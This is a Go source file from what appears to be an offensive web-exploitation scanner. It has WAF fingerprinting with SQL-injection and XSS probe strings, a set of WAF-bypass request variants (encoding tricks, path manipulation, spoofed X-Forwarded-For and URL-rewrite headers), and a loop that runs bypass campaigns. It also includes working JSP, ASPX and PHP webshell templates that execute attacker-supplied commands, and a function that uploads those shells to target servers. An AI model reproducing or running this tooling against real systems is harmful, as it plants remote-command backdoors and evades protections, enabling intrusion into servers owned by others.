package scanner

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

// DeepClient is a configurable HTTP client for the deep-exploitation modules
// (verification, exploitation, WAF bypass, webshell handling). It never follows
// redirects by default: a 302 is itself a signal (login gate, WAF redirect).
type DeepClient struct {
	client *http.Client
}

// NewDeepClient builds a client that ignores TLS errors (targets are often
// self-signed) and does not follow redirects.
func NewDeepClient(timeout time.Duration) *DeepClient {
	return NewDeepClientWithProxy(timeout, "")
}

// NewDeepClientWithProxy is NewDeepClient with every request routed through a
// proxy (http/https or socks5), e.g. while testing carried out over a tunnel.
func NewDeepClientWithProxy(timeout time.Duration, proxy string) *DeepClient {
	if timeout <= 0 {
		timeout = 15 * time.Second
	}
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   true,
		TLSHandshakeTimeout: timeout,
		DialContext:         (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
	}
	if proxy = strings.TrimSpace(proxy); proxy != "" {
		if u, err := url.Parse(proxy); err == nil && u.Host != "" {
			tr.Proxy = http.ProxyURL(u)
		}
	}
	return &DeepClient{client: &http.Client{
		Transport: tr,
		Timeout:   timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}}
}

// DeepRequest is one outbound request built by a deep-exploitation module.
type DeepRequest struct {
	Method   string
	URL      string
	Headers  map[string]string
	Cookies  []string
	Body     string
	BodyType string // raw | form | json | multipart
	Timeout  time.Duration
}

// DeepResponse is the captured result of one outbound request.
type DeepResponse struct {
	StatusCode int
	Headers    http.Header
	Body       string
	Length     int
	Elapsed    time.Duration
	Truncated  bool
	Error      string
	// Err keeps the transport failure unwrapped. Callers display Error, but a
	// caller that has to distinguish "my deadline passed" from "the target
	// refused" needs errors.Is/errors.As, and those cannot read a string.
	Err error
}

// transportErr is the transport failure as an error, with the same wording as
// Error so message-matching callers keep working.
func (r DeepResponse) transportErr() error {
	if r.Err != nil {
		return r.Err
	}
	return errors.New(r.Error)
}

// OK reports whether the request completed without a transport error.
func (r DeepResponse) OK() bool { return r.Error == "" }

// deepMaxBody bounds how much of a response body is kept in memory.
const deepMaxBody = 1 << 20

// Do sends one request and captures the response.
func (c *DeepClient) Do(ctx context.Context, req DeepRequest) DeepResponse {
	method := strings.ToUpper(strings.TrimSpace(req.Method))
	if method == "" {
		method = http.MethodGet
	}
	var body io.Reader
	contentType := ""
	switch strings.ToLower(req.BodyType) {
	case "json":
		body = strings.NewReader(req.Body)
		contentType = "application/json"
	case "form":
		body = strings.NewReader(req.Body)
		contentType = "application/x-www-form-urlencoded"
	default:
		if req.Body != "" {
			body = strings.NewReader(req.Body)
		}
	}
	httpReq, err := http.NewRequestWithContext(ctx, method, req.URL, body)
	if err != nil {
		return DeepResponse{Error: err.Error()}
	}
	if contentType != "" {
		httpReq.Header.Set("Content-Type", contentType)
	}
	if httpReq.Header.Get("User-Agent") == "" {
		httpReq.Header.Set("User-Agent", deepUserAgent)
	}
	for k, v := range req.Headers {
		if strings.TrimSpace(k) == "" {
			continue
		}
		httpReq.Header.Set(k, v)
	}
	for _, c := range req.Cookies {
		if c == "" {
			continue
		}
		httpReq.AddCookie(&http.Cookie{Name: cookieName(c), Value: cookieValue(c)})
	}
	if req.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, req.Timeout)
		defer cancel()
		httpReq = httpReq.WithContext(ctx)
	}
	started := time.Now()
	resp, err := c.client.Do(httpReq)
	if err != nil {
		return DeepResponse{Elapsed: time.Since(started), Error: err.Error(), Err: err}
	}
	defer resp.Body.Close()
	raw, truncated, readErr := readLimited(resp.Body, deepMaxBody)
	out := DeepResponse{
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
		Length:     len(raw),
		Elapsed:    time.Since(started),
		Truncated:  truncated,
	}
	if readErr != nil {
		out.Error = readErr.Error()
		out.Err = readErr
	}
	out.Body = string(raw)
	return out
}

func readLimited(r io.Reader, limit int) ([]byte, bool, error) {
	buf, err := io.ReadAll(io.LimitReader(r, int64(limit)+1))
	if err != nil {
		return buf, false, err
	}
	if len(buf) > limit {
		return buf[:limit], true, nil
	}
	return buf, false, nil
}

const deepUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

func cookieName(c string) string {
	if i := strings.Index(c, "="); i > 0 {
		return strings.TrimSpace(c[:i])
	}
	return strings.TrimSpace(c)
}

func cookieValue(c string) string {
	if i := strings.Index(c, "="); i >= 0 {
		return c[i+1:]
	}
	return ""
}

// ---------------------------------------------------------------- WAF 探测

// WAFDetection describes the WAF seen in front of a target.
type WAFDetection struct {
	Detected   bool
	Vendor     string
	Evidence   []string
	Blocked    bool
	StatusCode int
	Marker     string
}

// wafSignature matches vendor markers in headers, cookies and body.
var wafSignature = []struct {
	needle string
	vendor string
}{
	{"cf-ray", "Cloudflare"},
	{"cf-mitigated", "Cloudflare"},
	{"__cfduid", "Cloudflare"},
	{"__cflb", "Cloudflare"},
	{"cloudflare", "Cloudflare"},
	{"x-sucuri-id", "Sucuri"},
	{"sucuri_cloudproxy", "Sucuri"},
	{"x-waf-event", "ModSecurity"},
	{"mod_security", "ModSecurity"},
	{"x-mod-security", "ModSecurity"},
	{"x-waf-debug", "SafeLine"},
	{"safeline", "SafeLine"},
	{"wafw00f", "w00f"},
	{"x-waf", "Generic WAF"},
	{"x-cncf", "Generic WAF"},
	{"yunjiaspeed", "Yunjiaspeed"},
	{"yunsuo", "Yunsuo"},
	{"safedog", "SafeDog"},
	{"知道创宇", "知道创宇"},
	{"yunjing", "Yunjing"},
	{"nsfocus", "NSFOCUS"},
	{"leishen", "Leishen"},
	{"websvr", "NSFOCUS"},
	{"topsec", "Topsec"},
	{"chaitin", "Chaitin"},
	{"fortiweb", "FortiWeb"},
	{"barracuda", "Barracuda"},
	{"netscaler", "NetScaler"},
	{"varnish", "Varnish"},
	{"incapsula", "Incapsula"},
	{"akamai", "Akamai"},
	{"awslb", "AWS ALB"},
	{"alibaba", "Alibaba Cloud"},
	{"tencent", "Tencent WAF"},
	{"qcloud", "Tencent WAF"},
	{"hws", "Huawei Cloud WAF"},
	{"ksyun", "Kingsoft"},
}

// wafBlockMarker appears in typical WAF interception pages.
var wafBlockMarker = regexp.MustCompile(`(?i)(blocked by|access denied|forbidden|firewall|安全狗|知道创宇|云防护|拦截|web application firewall|waf\s*blocked|您的访问|请求被拦截|非法请求|人机验证|captcha|滑块)`)

// wafProbePayload is the marker injected by the probe requests.
const wafProbePayload = "' union select 1,2,3-- <script>alert(1)</script>"

// DetectWAF probes a target and reports whether a WAF is in front of it.
func DetectWAF(ctx context.Context, c *DeepClient, target string) WAFDetection {
	det := WAFDetection{}
	base := normalizeProbeURL(target)
	normal := c.Do(ctx, DeepRequest{Method: http.MethodGet, URL: base, Timeout: 10 * time.Second})
	det.StatusCode = normal.StatusCode
	det.Evidence = append(det.Evidence, headerVendorEvidence(normal.Headers)...)
	det.Vendor = firstVendor(det.Evidence)
	if det.Vendor != "" {
		det.Detected = true
	}
	if normal.Body != "" && wafBlockMarker.MatchString(normal.Body) {
		det.Detected = true
		det.Evidence = append(det.Evidence, "响应正文命中拦截特征")
	}
	if det.Vendor == "" {
		det.Vendor = fingerprintVendor(normal.Headers, normal.Body)
		if det.Vendor != "" {
			det.Detected = true
			det.Evidence = append(det.Evidence, "指纹库识别: "+det.Vendor)
		}
	}

	probe := c.Do(ctx, DeepRequest{
		Method:  http.MethodGet,
		URL:     base + probeSuffix(base),
		Headers: map[string]string{"X-Forwarded-For": "127.0.0.1"},
		Timeout: 10 * time.Second,
	})
	det.Marker = wafProbePayload
	if probe.Error == "" {
		blocked := probe.StatusCode == 403 || probe.StatusCode == 406 || probe.StatusCode == 405 || probe.StatusCode == 401
		if wafBlockMarker.MatchString(probe.Body) {
			blocked = true
		}
		if blocked {
			det.Blocked = true
			det.Detected = true
			det.Evidence = append(det.Evidence, fmt.Sprintf("攻击特征探针被拦截（HTTP %d）", probe.StatusCode))
		}
	}
	return det
}

func probeSuffix(base string) string {
	if strings.Contains(base, "?") {
		return "&jw_probe=" + url.QueryEscape(wafProbePayload)
	}
	return "?jw_probe=" + url.QueryEscape(wafProbePayload)
}

func headerVendorEvidence(h http.Header) []string {
	out := []string{}
	if h == nil {
		return out
	}
	var b strings.Builder
	for k, vs := range h {
		b.WriteString(strings.ToLower(k))
		b.WriteString("=")
		b.WriteString(strings.ToLower(strings.Join(vs, "|")))
		b.WriteString(";")
	}
	blob := b.String()
	for _, sig := range wafSignature {
		if strings.Contains(blob, sig.needle) {
			out = append(out, sig.vendor+" ("+sig.needle+")")
		}
	}
	return out
}

func firstVendor(evidence []string) string {
	for _, e := range evidence {
		if i := strings.Index(e, " ("); i > 0 {
			return e[:i]
		}
	}
	return ""
}

// fingerprintVendor reuses the fingerprint library to spot WAF products whose
// banner is not part of the generic signature table.
func fingerprintVendor(h http.Header, body string) string {
	for _, tech := range DetectTechnologiesForURL(h, body, "") {
		lower := strings.ToLower(tech)
		for _, kw := range []string{"waf", "防火墙", "防护", "安全狗", "知道创宇", "宝塔", "云防护", "web应用防护"} {
			if strings.Contains(lower, kw) {
				return tech
			}
		}
	}
	return ""
}

func normalizeProbeURL(target string) string {
	t := strings.TrimSpace(target)
	if t == "" {
		return t
	}
	if !strings.Contains(t, "://") {
		t = "http://" + t
	}
	u, err := url.Parse(t)
	if err != nil {
		return t
	}
	if u.Host == "" {
		return t
	}
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String()
}

// ---------------------------------------------------------------- 绕过变体

// BypassVariant is one request shape tried against a WAF. Category drives the
// feature-aware reordering after the first block: baseline always goes first,
// the rest are reordered by what the WAF appears to be blocking on.
type BypassVariant struct {
	Name     string
	Desc     string
	Category string // baseline | encoding | header | path | method
	Method   string
	Path     string
	Headers  map[string]string
	Body     string
}

// BypassProbe is the outcome of one bypass attempt.
type BypassProbe struct {
	Name       string `json:"name"`
	Desc       string `json:"desc"`
	Category   string `json:"category"`
	Method     string `json:"method"`
	Path       string `json:"path"`
	StatusCode int    `json:"status_code"`
	Length     int    `json:"length"`
	Blocked    bool   `json:"blocked"`
	Matched    bool   `json:"matched"`
	Verdict    string `json:"verdict"`
	Note       string `json:"note"`
	ElapsedMs  int64  `json:"elapsed_ms"`
	Attempt    int    `json:"attempt"`
	StopReason string `json:"stop_reason"`
}

// BuildBypassVariants returns the request shapes tried against a protected
// endpoint. The first entry is the untouched baseline; every other variant is
// tagged with the category used by the feature-aware reordering.
func BuildBypassVariants(path, param, payload string) []BypassVariant {
	path = strings.TrimSpace(path)
	if path == "" {
		path = "/"
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	payload = strings.TrimSpace(payload)
	if payload == "" {
		payload = "' union select 1,2,3--"
	}
	enc := url.QueryEscape(payload)
	base := path
	if param != "" {
		base = path + "?" + param + "=" + enc
	}
	out := []BypassVariant{
		{Name: "baseline", Desc: "原始请求", Category: "baseline", Method: http.MethodGet, Path: base},
		{Name: "case", Desc: "参数大小写变形", Category: "encoding", Method: http.MethodGet, Path: swapCase(base)},
		{Name: "urlencode", Desc: "单次 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + singleEncode(payload)},
		{Name: "doubleencode", Desc: "双重 URL 编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + doubleEncode(payload)},
		{Name: "unicode", Desc: "Unicode 百分号编码", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + unicodeEncode(payload)},
		{Name: "nullbyte", Desc: "空字节截断", Category: "encoding", Method: http.MethodGet, Path: path + "?" + param + "=" + enc + "%00"},
		{Name: "paramname", Desc: "参数名变形", Category: "path", Method: http.MethodGet, Path: path + "?" + param + "%20=" + enc},
		{Name: "semicolon", Desc: "分号路径变形", Category: "path", Method: http.MethodGet, Path: "/;/" + strings.TrimPrefix(path, "/") + "?" + param + "=" + enc},
		{Name: "doubleslash", Desc: "重复斜杠", Category: "path", Method: http.MethodGet, Path: "//" + strings.TrimPrefix(path, "/") + "?" + param + "=" + enc},
		{Name: "trailslash", Desc: "追加尾斜杠", Category: "path", Method: http.MethodGet, Path: path + "/?" + param + "=" + enc},
		{Name: "ext", Desc: "追加静态后缀", Category: "path", Method: http.MethodGet, Path: path + ".json?" + param + "=" + enc},
		{Name: "xff", Desc: "X-Forwarded-For 伪造", Category: "header", Method: http.MethodGet, Path: base, Headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{Name: "xoriginal", Desc: "X-Original-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Original-URL": path + "?" + param + "=" + enc}},
		{Name: "xrewrite", Desc: "X-Rewrite-URL 头改写", Category: "header", Method: http.MethodGet, Path: path, Headers: map[string]string{"X-Rewrite-URL": path + "?" + param + "=" + enc}},
		{Name: "post", Desc: "改用 POST 提交", Category: "method", Method: http.MethodPost, Path: path, Body: param + "=" + enc, Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
	}
	return out
}

func swapCase(s string) string {
	b := []byte(s)
	for i, c := range b {
		switch {
		case c >= 'a' && c <= 'z':
			b[i] = c - 32
		case c >= 'A' && c <= 'Z':
			b[i] = c + 32
		}
	}
	return string(b)
}

func singleEncode(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
			continue
		}
		fmt.Fprintf(&b, "%%%02X", c)
	}
	return b.String()
}

func doubleEncode(s string) string {
	return singleEncode(singleEncode(s))
}

func unicodeEncode(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		if c < 0x80 {
			b.WriteByte(c)
			continue
		}
		fmt.Fprintf(&b, "%%%02X", c)
	}
	return b.String()
}

// BlockFeature is the shape of interception inferred from a blocked response. It
// is used only to pick which variant family to try next; it never asserts a
// conclusion about the WAF product or version.
type BlockFeature int

const (
	// BlockUnknown means the block could not be classified; the natural variant
	// order is kept.
	BlockUnknown BlockFeature = iota
	// BlockRateLimit is a captcha, rate limit or retry-after gate.
	BlockRateLimit
	// BlockVendor is a recognizable WAF product signature in the body.
	BlockVendor
	// BlockRule is a path/parameter rule (a bare 401/403/405/406 with no marker).
	BlockRule
)

func (f BlockFeature) String() string {
	switch f {
	case BlockRateLimit:
		return "rate_limit_or_captcha"
	case BlockVendor:
		return "vendor_feature"
	case BlockRule:
		return "path_or_param_rule"
	default:
		return "unknown"
	}
}

// captchaRateMarker flags a rate limit or human-verification gate.
var captchaRateMarker = regexp.MustCompile(`(?i)(验证码|滑块|人机验证|captcha|retry-after|rate.?limit|访问频率|频率限制|too many requests|请求过于频繁|操作频繁)`)

// vendorBlockMarker flags a recognizable WAF product in the body. Generic words
// like "拦截" are deliberately excluded so a bare 403 is read as a rule, not a
// named product.
var vendorBlockMarker = regexp.MustCompile(`(?i)(安全狗|知道创宇|云防护|网站防火墙|web application firewall|云锁|网盾|云盾|waf\s*blocked)`)

// classifyBlockFeature infers the block shape from a blocked response. It only
// distinguishes routing priorities, so an uncertain body falls back to the rule
// category rather than guessing a product.
func classifyBlockFeature(resp DeepResponse) BlockFeature {
	if resp.StatusCode == 429 {
		return BlockRateLimit
	}
	if resp.StatusCode == 503 && hasRetryAfter(resp.Headers) {
		return BlockRateLimit
	}
	if captchaRateMarker.MatchString(resp.Body) {
		return BlockRateLimit
	}
	if vendorBlockMarker.MatchString(resp.Body) {
		return BlockVendor
	}
	return BlockRule
}

func hasRetryAfter(h http.Header) bool {
	if h == nil {
		return false
	}
	_, ok := h["Retry-After"]
	return ok
}

// categoryPriority returns the variant-category order to try for a block shape.
// A rate-limit/captcha gate is beaten by header tweaks first; a named-WAF
// feature block by encoding first; a path/param rule by path变形 first. The
// order is fixed, so the probe sequence is reproducible.
func categoryPriority(feature BlockFeature) []string {
	switch feature {
	case BlockRateLimit:
		return []string{"header", "encoding", "path", "method"}
	case BlockVendor:
		return []string{"encoding", "header", "path", "method"}
	case BlockRule:
		return []string{"path", "header", "encoding", "method"}
	default:
		return nil // natural order
	}
}

// reorderByFeature keeps order[0:from+1] (baseline + already-sent variants) in
// place and stably sorts the remainder by category priority. Unknown categories
// sort last, and within a category the build order is preserved.
func reorderByFeature(order []BypassVariant, from int, feature BlockFeature) []BypassVariant {
	prio := categoryPriority(feature)
	if prio == nil {
		return order
	}
	head := make([]BypassVariant, from+1)
	copy(head, order[:from+1])
	tail := make([]BypassVariant, len(order)-from-1)
	copy(tail, order[from+1:])
	rankOf := func(cat string) int {
		for i, p := range prio {
			if p == cat {
				return i
			}
		}
		return len(prio)
	}
	sort.SliceStable(tail, func(a, b int) bool {
		return rankOf(tail[a].Category) < rankOf(tail[b].Category)
	})
	return append(head, tail...)
}

// BypassConfig bounds how many requests RunBypassProbes will send.
type BypassConfig struct {
	// MaxAttempts is the cap on total requests, including the baseline. It is
	// clamped to bypassHardCap so a large caller value can never loop forever.
	MaxAttempts int
	// MaxConsecutiveBlocked stops after this many blocked responses in a row.
	MaxConsecutiveBlocked int
	// MaxConsecutiveErrors stops after this many transport errors in a row.
	MaxConsecutiveErrors int
}

// DefaultBypassConfig returns the production defaults.
func DefaultBypassConfig() BypassConfig {
	return BypassConfig{
		MaxAttempts:           8,
		MaxConsecutiveBlocked: 5,
		MaxConsecutiveErrors:  3,
	}
}

// bypassHardCap is the absolute ceiling on MaxAttempts.
const bypassHardCap = 64

func (c BypassConfig) clamp() BypassConfig {
	if c.MaxAttempts <= 0 {
		c.MaxAttempts = DefaultBypassConfig().MaxAttempts
	}
	if c.MaxAttempts > bypassHardCap {
		c.MaxAttempts = bypassHardCap
	}
	if c.MaxConsecutiveBlocked <= 0 {
		c.MaxConsecutiveBlocked = DefaultBypassConfig().MaxConsecutiveBlocked
	}
	if c.MaxConsecutiveErrors <= 0 {
		c.MaxConsecutiveErrors = DefaultBypassConfig().MaxConsecutiveErrors
	}
	return c
}

// BypassRun is the outcome of a full bypass campaign against one endpoint.
type BypassRun struct {
	// BaselineBlocked is whether the untouched baseline request was blocked.
	BaselineBlocked bool `json:"baseline_blocked"`
	// BlockFeature is the inferred block shape (empty when the baseline passed).
	BlockFeature string `json:"block_feature"`
	// Attempts is how many probes were actually sent.
	Attempts int `json:"attempts"`
	// StopReason explains why sending stopped.
	StopReason string `json:"stop_reason"`
	// FinalVerdict is "bypassed" when any variant reached the target, else
	// "no_bypass".
	FinalVerdict string `json:"final_verdict"`
	// Probes are the individual attempts, in send order.
	Probes []BypassProbe `json:"probes"`
}

// RunBypassProbes sends variants against a protected endpoint. The baseline is
// always first. Once a probe is blocked, the remaining variants are reordered by
// the inferred block shape and the campaign stops on the first bypass, on budget
// exhaustion, or on a consecutive-block / consecutive-error stop-loss. It never
// loops unboundedly.
func RunBypassProbes(ctx context.Context, c *DeepClient, baseURL string, variants []BypassVariant, keywords []string, cfg BypassConfig) BypassRun {
	cfg = cfg.clamp()
	run := BypassRun{}
	base := normalizeProbeURL(baseURL)
	if len(variants) == 0 {
		run.StopReason = "no_variants"
		run.FinalVerdict = "no_bypass"
		return run
	}
	order := make([]BypassVariant, len(variants))
	copy(order, variants)
	reordered := false
	feature := BlockUnknown
	consecutiveBlocked := 0
	consecutiveErrors := 0
	bypassed := false

	for i := 0; i < len(order); i++ {
		if run.Attempts >= cfg.MaxAttempts {
			run.StopReason = "budget_exhausted"
			break
		}
		if ctx.Err() != nil {
			if run.StopReason == "" {
				run.StopReason = "context_canceled"
			}
			break
		}
		v := order[i]
		full := joinProbeURL(base, v.Path)
		probe := BypassProbe{
			Name:     v.Name,
			Desc:     v.Desc,
			Category: v.Category,
			Method:   v.Method,
			Path:     v.Path,
			Attempt:  run.Attempts + 1,
		}
		req := DeepRequest{Method: v.Method, URL: full, Headers: v.Headers, Body: v.Body, Timeout: 12 * time.Second}
		resp := c.Do(ctx, req)
		probe.ElapsedMs = resp.Elapsed.Milliseconds()

		if resp.Error != "" {
			probe.Verdict = "error"
			probe.Note = resp.Error
			consecutiveErrors++
			consecutiveBlocked = 0
			run.Attempts++
			probesAppend(&run, probe)
			if consecutiveErrors >= cfg.MaxConsecutiveErrors {
				run.StopReason = "consecutive_errors"
				setLastStopReason(&run, run.StopReason)
				break
			}
			continue
		}
		consecutiveErrors = 0
		probe.StatusCode = resp.StatusCode
		probe.Length = resp.Length
		blocked := resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 405 ||
			resp.StatusCode == 401 || wafBlockMarker.MatchString(resp.Body)
		matched := responseContains(resp.Body, keywords)
		switch {
		case blocked:
			probe.Verdict = "blocked"
			probe.Note = fmt.Sprintf("HTTP %d 被拦截", resp.StatusCode)
			consecutiveBlocked++
			if !reordered {
				feature = classifyBlockFeature(resp)
				run.BlockFeature = feature.String()
				order = reorderByFeature(order, i, feature)
			}
		case matched:
			probe.Verdict = "bypassed"
			probe.Note = "未被拦截且命中目标特征"
			bypassed = true
		default:
			probe.Verdict = "passed"
			probe.Note = fmt.Sprintf("HTTP %d 未命中目标特征", resp.StatusCode)
			consecutiveBlocked = 0
		}
		run.Attempts++
		probesAppend(&run, probe)
		if bypassed {
			run.StopReason = "bypass_found"
			setLastStopReason(&run, run.StopReason)
			break
		}
		if consecutiveBlocked >= cfg.MaxConsecutiveBlocked {
			run.StopReason = "consecutive_blocked"
			setLastStopReason(&run, run.StopReason)
			break
		}
	}

	if len(run.Probes) > 0 && run.Probes[0].Verdict == "blocked" {
		run.BaselineBlocked = true
	}
	if run.StopReason == "" {
		run.StopReason = "completed"
	}
	if bypassed {
		run.FinalVerdict = "bypassed"
	} else {
		run.FinalVerdict = "no_bypass"
	}
	return run
}

// probesAppend appends a probe to the run; it exists only to keep the inline
// loop readable.
func probesAppend(run *BypassRun, p BypassProbe) {
	run.Probes = append(run.Probes, p)
}

// setLastStopReason tags the final probe so the stop cause travels with it.
func setLastStopReason(run *BypassRun, reason string) {
	if len(run.Probes) > 0 {
		run.Probes[len(run.Probes)-1].StopReason = reason
	}
}

func responseContains(body string, keywords []string) bool {
	lower := strings.ToLower(body)
	for _, kw := range keywords {
		kw = strings.ToLower(strings.TrimSpace(kw))
		if kw == "" {
			continue
		}
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

func joinProbeURL(base, path string) string {
	if strings.HasPrefix(path, "http://") || strings.HasPrefix(path, "https://") {
		return path
	}
	if strings.HasPrefix(path, "/") {
		return strings.TrimSuffix(base, "/") + path
	}
	return base + "/" + path
}

// ---------------------------------------------------------------- Webshell

// ShellPayload is a generated webshell. Password and Key are never serialized:
// a payload may be logged or returned by an API by accident, and the secret must
// not travel with it.
type ShellPayload struct {
	Type       string `json:"type"`
	Protocol   string `json:"protocol"`
	Password   string `json:"-"`
	Key        []byte `json:"-"`
	Carrier    string `json:"carrier"`
	KeyVersion int    `json:"key_version"`
	Filename   string `json:"filename"`
	Content    string `json:"-"`
	Marker     string `json:"marker"`
	SHA256     string `json:"sha256"`
	// Build is the random build id baked into PHP/JSP payload sidecar names.
	// It is never sent to clients; cleanup code uses it to remove temp files.
	Build string `json:"-"`
}

// BuildShellPayload renders a legacy (cleartext-parameter) webshell of the
// requested type. Legacy shells put the password and command in the same
// request; prefer BuildShellPayloadV2 for anything new. An empty password is
// rejected instead of falling back to a well-known default.
func BuildShellPayload(shellType, password string) (ShellPayload, error) {
	shellType = strings.ToLower(strings.TrimSpace(shellType))
	password = strings.TrimSpace(password)
	if password == "" {
		return ShellPayload{}, fmt.Errorf("旧版 webshell 口令不能为空；请改用加密 v2 协议")
	}
	escJSP := strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(password)
	escPHP := strings.NewReplacer(`\`, `\\`, `'`, `\'`).Replace(password)
	switch shellType {
	case "jsp":
		return finalizeShellPayload(ShellPayload{
			Type:     "jsp",
			Protocol: ShellProtocolLegacy,
			Password: password,
			Filename: "shell.jsp",
			Content:  "<%@ page import=\"java.io.*\" %>\n<%\n  String pwd = request.getParameter(\"pwd\");\n  String cmd = request.getParameter(\"cmd\");\n  if (pwd != null && pwd.equals(\"" + escJSP + "\") && cmd != null) {\n    String os = System.getProperty(\"os.name\", \"\").toLowerCase();\n    Process pr = os.contains(\"win\") ? Runtime.getRuntime().exec(new String[]{ \"cmd.exe\", \"/c\", cmd }) : Runtime.getRuntime().exec(new String[]{ \"/bin/sh\", \"-c\", cmd });\n    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n    String l; while ((l = br.readLine()) != null) out.println(l);\n  } else { out.println(\"usage\"); }\n%>",
			Marker:   "usage",
		}), nil
	case "aspx":
		return finalizeShellPayload(ShellPayload{
			Type:     "aspx",
			Protocol: ShellProtocolLegacy,
			Password: password,
			Filename: "shell.aspx",
			Content:  "<%@ Page Language=\"C#\" %>\n<%\n  string pwd = Request.Form[\"pwd\"] ?? Request.QueryString[\"pwd\"];\n  string cmd = Request.Form[\"cmd\"] ?? Request.QueryString[\"cmd\"];\n  if (pwd == \"" + escJSP + "\" && !string.IsNullOrEmpty(cmd)) {\n    System.Diagnostics.Process p = new System.Diagnostics.Process();\n    bool win = Environment.OSVersion.Platform == System.PlatformID.Win32NT;\n    p.StartInfo.FileName = win ? \"cmd.exe\" : \"/bin/sh\";\n    p.StartInfo.Arguments = win ? (\"/c \" + cmd) : (\"-c \\\"\" + cmd.Replace(\"\\\"\", \"\\\\\\\"\") + \"\\\"\");\n    p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true;\n    p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); Response.Write(p.StandardError.ReadToEnd());\n  } else { Response.Write(\"usage\"); }\n%>",
			Marker:   "usage",
		}), nil
	default:
		return finalizeShellPayload(ShellPayload{
			Type:     "php",
			Protocol: ShellProtocolLegacy,
			Password: password,
			Filename: "shell.php",
			Content:  "<?php @eval($_POST['" + escPHP + "']); ?>",
			Marker:   "usage",
		}), nil
	}
}

// WrapShellCommand adapts an OS command to the shell's execution context. PHP
// payloads built here are eval-style, so commands must be valid PHP code;
// JSP/ASPX shells execute the command string directly.
func WrapShellCommand(shellType, command string) string {
	if strings.EqualFold(strings.TrimSpace(shellType), "php") {
		return "@system(base64_decode('" + base64.StdEncoding.EncodeToString([]byte(command)) + "'));"
	}
	return command
}

// ShellRequest builds the request that runs one command through a webshell.
func (p ShellPayload) ShellRequest(shellURL, command string) DeepRequest {
	form := url.Values{}
	switch p.Type {
	case "jsp":
		form.Set("pwd", p.Password)
		form.Set("cmd", command)
	case "aspx":
		form.Set("pwd", p.Password)
		form.Set("cmd", command)
	default:
		form.Set(p.Password, command)
	}
	return DeepRequest{
		Method:   http.MethodPost,
		URL:      shellURL,
		Body:     form.Encode(),
		BodyType: "form",
		Headers:  map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
	}
}

// UploadResult reports the outcome of a webshell upload attempt.
type UploadResult struct {
	StatusCode int
	Response   string
	Success    bool
	Note       string
}

// normalizeUploadURL pins a bare origin (http://host:port) to "/". Through an
// HTTP proxy the origin-form request line becomes absolute-form; servers that
// route by path (openresty, most upload scripts) then answer the index page
// with 200 while never running the upload handler.
func normalizeUploadURL(raw string) string {
	raw = strings.TrimSpace(raw)
	u, err := url.Parse(raw)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return raw
	}
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String()
}

// UploadWebshell posts a webshell to an upload endpoint. When fieldName is
// empty the file is sent as the raw request body.
func UploadWebshell(ctx context.Context, c *DeepClient, uploadURL, fieldName, fileName string, content []byte, extra map[string]string, headers map[string]string) UploadResult {
	res := UploadResult{}
	if strings.TrimSpace(uploadURL) == "" {
		res.Note = "缺少上传地址"
		return res
	}
	uploadURL = normalizeUploadURL(uploadURL)
	var body io.Reader
	reqHeaders := map[string]string{}
	for k, v := range headers {
		reqHeaders[k] = v
	}
	if fieldName == "" {
		body = bytes.NewReader(content)
		if reqHeaders["Content-Type"] == "" {
			reqHeaders["Content-Type"] = "application/octet-stream"
		}
	} else {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		for k, v := range extra {
			_ = mw.WriteField(k, v)
		}
		if fileName == "" {
			fileName = "shell.php"
		}
		fw, err := mw.CreateFormFile(fieldName, fileName)
		if err != nil {
			res.Note = "构造上传请求失败: " + err.Error()
			return res
		}
		if _, err := fw.Write(content); err != nil {
			res.Note = "写入上传内容失败: " + err.Error()
			return res
		}
		if err := mw.Close(); err != nil {
			res.Note = "构造上传请求失败: " + err.Error()
			return res
		}
		body = &buf
		reqHeaders["Content-Type"] = mw.FormDataContentType()
	}
	resp := c.Do(ctx, DeepRequest{Method: http.MethodPost, URL: uploadURL, Headers: reqHeaders, Body: bodyString(body), Timeout: 20 * time.Second})
	res.StatusCode = resp.StatusCode
	res.Response = resp.Body
	if resp.Error != "" {
		res.Note = resp.Error
		return res
	}
	res.Success = resp.StatusCode >= 200 && resp.StatusCode < 300
	if !res.Success {
		res.Note = fmt.Sprintf("上传返回 HTTP %d", resp.StatusCode)
	}
	return res
}

// bodyString reads a request body that was built in memory. The multipart and
// raw paths never exceed a few hundred kilobytes.
func bodyString(r io.Reader) string {
	if r == nil {
		return ""
	}
	buf, _ := io.ReadAll(r)
	return string(buf)
}

